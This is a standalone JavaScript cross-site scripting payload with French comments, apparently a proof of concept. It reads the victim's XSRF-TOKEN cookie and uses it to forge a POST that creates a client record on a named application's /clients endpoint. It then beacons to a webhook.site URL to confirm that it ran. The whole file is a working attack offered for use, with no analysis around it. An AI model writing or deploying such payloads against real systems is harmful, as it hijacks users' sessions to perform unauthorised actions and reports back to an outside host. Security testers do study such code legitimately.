(function () {
  // 🔐 Récupérer le token CSRF depuis le cookie
  const tokenMatch = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
  if (!tokenMatch) return;
  const token = decodeURIComponent(tokenMatch[1]);

  // 📦 Préparer les données POST
  const body = new URLSearchParams({
    client_name: "ExploitXSS",
    email: "xss@evil.com",
    phone_number: "0102030405",
    phone_type: "mobile",
    address: "Injecté via XSS",
    _token: token
  });

  // 🎯 Requête POST avec URL absolue et Referer
  fetch("https://current-legacy.ci.plany.app/clients", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Referer": "https://current-legacy.ci.plany.app/clients"
    },
    body: body.toString()
  });

  // (Optionnel) ping webhook.site pour confirmer exécution
  fetch("https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386?status=client_payload_executed");
})();
